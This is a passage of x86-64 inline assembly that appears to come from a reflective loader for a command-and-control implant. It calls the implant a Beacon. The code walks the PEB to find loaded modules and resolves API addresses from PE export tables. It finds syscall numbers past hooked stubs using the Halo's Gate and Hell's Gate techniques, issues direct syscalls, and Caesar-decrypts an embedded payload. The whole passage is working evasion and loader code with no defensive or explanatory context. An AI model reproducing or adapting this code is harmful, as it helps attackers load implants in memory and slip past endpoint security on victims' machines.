    "add rdx, 0x24 \n"              // unsigned long AddressOfNameOrdinals; // 0x24 offset
    "mov eax, [rdx] \n"             // RVAExportAddressOfNameOrdinals (Value/RVA)
    "add rax, rcx \n"               // VA ExportAddressOfNameOrdinals
    "ret \n" // return ExportOrdinalTable;
"getNumberOfNames: \n"
    "xor rax, rax \n"
    "mov eax, [rcx+0x18] \n"
    "ret \n"
"getSymbolAddress: \n"
    "mov r10, [rsp+0x28] \n"        // ExportNameTable
    "mov r11, [rsp+0x30] \n"        // ExportOrdinalTable
    "xor rax, rax \n"
    "mov eax, [rsp+0x38] \n"        // NumberOfNames
    "dec rax \n"
    "xchg rcx, rdx \n"              // symbolStringSize & RDX =symbolString
    "push rcx \n"                   // push str len to stack
"lFindSym: \n"
    "mov rcx, [rsp] \n"             // unsigned long symbolStringSize (Reset string length counter for each loop)
    "xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
    "mov edi, [r10+rax*4] \n"       // RVA NameString = [&NamePointerTable + (Counter * 4)]
    "add rdi, r8 \n"                // &NameString    = RVA NameString + &module.dll
    "mov rsi, rdx \n"               // Address of API Name String to match on the Stack (reset to start of string)
    "repe cmpsb \n"                 // Compare strings at RDI & RSI
    "je FoundSym \n"                // If match then we found the API string. Now we need to find the Address of the API
    "test rax, rax \n"
    "je NotFoundSym \n"             // If we check every exported function, return NULL
    "dec rax \n"                    // Decrement to check if the next name matches
    "jmp short lFindSym \n"         // Jump back to start of loop
"FoundSym: \n"
    "pop rcx \n"                    // Remove string length counter from top of stack
    "mov ax, [r11+rax*2] \n"        // [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
    "mov eax, [r9+rax*4] \n"        // RVA API = [&AddressTable + API OrdinalNumber]
    "add rax, r8 \n"                // module.<API> = RVA module.<API> + module.dll BaseAddress
    "ret \n"
"NotFoundSym: \n"
    "pop rcx \n"                    // Remove string length counter from top of stack
    "xor rax, rax \n"
    "ret \n"
"getNewExeHeader: \n"
    "xor rax, rax \n"
    "mov eax, [rcx+0x3C] \n"        // Offset NewEXEHeader
    "add rax, rcx \n"               // &module.dll + Offset NewEXEHeader = &NewEXEHeader
    "ret \n" // return NewExeHeader;
"getDllSize: \n"
    "xor rbx, rbx \n"
    "mov ebx, [rcx+0x50] \n"        // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfImage
    "mov rax, rbx \n"
    "ret \n" // return dllSize;
"getDllSizeOfHeaders: \n"
    "xor rbx, rbx \n"
    "mov ebx, [rax+0x54] \n"        // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfHeaders
    "mov rax, rbx \n"
    "ret \n" // return SizeOfHeaders;
"Memcpy: \n"
    "test r8, r8 \n"                // check if r8 = 0
    "jne copy1 \n"                  // if r8 == 0, ret
    "ret \n"
"copy1: \n"
    "dec r8 \n"                     // Decrement the counter
    "mov bl, [rdx] \n"              // Load the next byte to write into the BL register
    "mov [rcx], bl \n"              // write the byte
    "inc rdx \n"                    // move rdx to next byte of source
    "inc rcx \n"                    // move rcx to next byte of destination
    "test r8, r8 \n"                // check if r8 = 0
    "jne copy1 \n"                  // if r8 != 0, then write next byte via loop
    "ret \n"
"getOptionalHeader: \n"
    "add rcx, 0x18 \n"
    "xchg rax, rcx \n"
    "ret \n" // return OptionalHeader
"getSizeOfOptionalHeader: \n"
    "add rcx, 0x14 \n"              // &FileHeader.SizeOfOptionalHeader
    "xor rbx, rbx \n"
    "mov bx, [rcx] \n"              // Value of FileHeader.SizeOfOptionalHeader
    "xchg rax, rbx \n"
    "ret \n"
"add: \n"
    "add rcx, rdx \n"
    "xchg rax, rcx \n"
    "ret \n"
"getNumberOfSections: \n"
    "add rcx, 0x6 \n"               // &FileHeader.NumberOfSections
    "xor rax, rax \n"
    "mov ax, [rcx] \n"
    "ret \n"
"getBeaconEntryPoint: \n"
    "add rdx, 0x10 \n"              // OptionalHeader.AddressOfEntryPoint
    "mov eax, [rdx] \n"
    "add rax, rcx \n"               // newRdllAddr.EntryPoint
    "ret \n" // return newRdllAddrEntryPoint
"copyWithDelimiter: \n"
    "xor rax, rax \n"               // number of bytes copied
    "copyLoop: \n"
    "mov r10, rax \n"
    "sub r10, r8 \n"                // check if we copied enough bytes
    "jns copydone \n"
    "mov bl, [rdx] \n"              // read byte
    "mov [rcx], bl \n"              // write byte
    "inc rdx \n"
    "inc rcx \n"
    "inc rax \n"                    // increment bytes written
    "cmp bl, r9b \n"                // check if we found the delimiter
    "je copydone\n"
    "jmp copyLoop \n"
    "copydone: \n"
    "ret \n"

"getSyscallNumber: \n"
    "push rcx \n"
    "call findSyscallNumber \n"     // try to read the syscall directly
    "pop rcx \n"
    "test ax, ax \n"
    "jne syscallnothooked \n"
    "mov dx, 0 \n"                 // index = 0
"loopoversyscalls: \n"
    "push rcx \n"
    "push dx \n"
    "call halosGateUp\n"            // try to read the syscall above
    "pop dx \n"
    "pop rcx \n"
    "test ax, ax \n"
    "jne syscallnothookedup \n"
    "push rcx \n"
    "push dx \n"
    "call halosGateDown\n"          // try to read the syscall below
    "pop dx \n"
    "pop rcx \n"
    "test ax, ax \n"
    "jne syscallnothookeddown \n"
    "inc dx \n"                    // increment the index
    "jmp loopoversyscalls \n"
"syscallnothooked: \n"
    "ret \n"
"syscallnothookedup: \n"
    "sub ax, dx \n"
    "ret \n"
"syscallnothookeddown: \n"
    "add ax, dx \n"
    "ret \n"
"findSyscallNumber: \n"
    "xor rsi, rsi \n"
    "xor rdi, rdi \n"
    "mov rsi, 0x00B8D18B4C \n"
    "mov edi, [rcx] \n"
    "cmp rsi, rdi \n"
    "jne error \n"
    "xor rax,rax \n"
    "mov ax, [rcx+4] \n"
    "ret \n"
"error: \n"
    "xor rax, rax \n"
    "ret \n"
"halosGateUp: \n"
    "xor rsi, rsi \n"
    "xor rdi, rdi \n"
    "mov rsi, 0x00B8D18B4C \n"
    "xor rax, rax \n"
    "mov al, 0x20 \n"
    "mul dx \n"
    "add rcx, rax \n"
    "mov edi, [rcx] \n"
    "cmp rsi, rdi \n"
    "jne error \n"
    "xor rax,rax \n"
    "mov ax, [rcx+4] \n"
    "ret \n"
"halosGateDown: \n"
    "xor rsi, rsi \n"
    "xor rdi, rdi \n"
    "mov rsi, 0x00B8D18B4C \n"
    "xor rax, rax \n"
    "mov al, 0x20 \n"
    "mul dx \n"
    "sub rcx, rax \n"
    "mov edi, [rcx] \n"
    "cmp rsi, rdi \n"
    "jne error \n"
    "xor rax,rax \n"
    "mov ax, [rcx+4] \n"
    "ret \n"
"HellsGate: \n"
    "xor r11, r11 \n"
    "mov r11d, ecx \n"
    "ret \n"
"HellDescent: \n"
    "xor rax, rax \n"
    "mov r10, rcx \n"
    "mov eax, r11d \n"
    "syscall \n"
    "ret \n"

"getFirstEntry: \n"
    "mov rax, gs:[0x60] \n"         // ProcessEnvironmentBlock // GS = TEB
    "mov rax, [rax+0x18] \n"        // _PEB_LDR_DATA
    "mov rax, [rax+0x20] \n"        // InMemoryOrderModuleList - First Entry (probably the host PE File)
    "ret \n"
"getNextEntry: \n"
    "mov rax, [rcx] \n"
    "cmp rdx, [rax] \n"             // Are we back at the same entry in the list?
    "jne notTheLast \n"
    "xor rax, rax \n"
"notTheLast: \n"
    "ret \n"
"getDllBaseFromEntry: \n"
    "mov rax, [rcx+0x20] \n"
    "ret \n"

"basicCaesar_Decrypt:\n"
 "mov rsi, rdx\n"
 "xor rax, rax\n"
 "add al, r8b\n"
"bcdLoop:\n"
 "sub [rsi], al\n"
 "inc rsi\n"
 "dec cl\n"
 "test cl,cl\n"
 "jnz bcdLoop\n"
 "ret\n"
);
